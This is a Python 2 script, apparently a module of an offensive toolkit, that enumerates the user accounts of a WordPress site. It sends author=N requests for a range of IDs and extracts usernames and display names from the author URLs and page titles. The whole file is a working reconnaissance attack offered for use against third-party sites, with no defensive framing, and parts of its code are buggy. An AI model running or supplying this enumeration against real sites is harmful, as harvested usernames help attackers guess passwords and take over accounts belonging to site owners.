##
## Wordpress users enumerate  bypass to get the website users.
##

from core.misc import printf
import urllib
import urllib2

def uniq(lst):
    last = object()
    for item in lst:
        if item == last:
            continue
        yield item
        last = item
def sort_and_deduplicate(l):
    return list(uniq(sorted(l, reverse=False)))
def curllib(req,param=None,postdata=None):
    headers = { 'User-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0',
                'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        req = urllib2.Request( req, postdata, headers)
        req = urllib2.urlopen(req, timeout = 30).read()
    except Exception as e:
        return False
    return req
def finder( text, start, end, index = 1 ):
    try:
        text = text.split(start)[index]
        return text.split(end)[0]
    except:
        return ""
def find_user(html=None):
    if html != None:
        return { "user": finder( html, '/author/', '/' ), "name": finder( html, '<title>', '</title>' ).split(',')[0] }
def user_scan(url,usern):
    results = []
    if 'http' not in url:
        try:
            urllib2.urlopen('https://' + url)
            site = 'https://' + url
        except:
            site = 'http://' + url
    else:
        site = url
    printf('[+] Wait a minute, scanning (%s)' % site)
    for x in range(0,int(usern)):
        try:
            tmp = curllib(site, '', urllib.urlencode({"author":(x+1)}))
            if tmp == False:

                continue
            tmp = find_user(tmp)
        except:
            pass
        if len(tmp['user']):
            results.append(tmp)
    if not results:
        printf('[!] Could not find anything, maybe not vulnerable!')
        return
    results = sort_and_deduplicate(results)
    printf("[+] Found "+str( len( results ) )+" users in "+site+"")
    for i in range(0,len(results)):
         printf(' User: %s\n Name: %s' % (results[i]['user'],results[i]['name']))
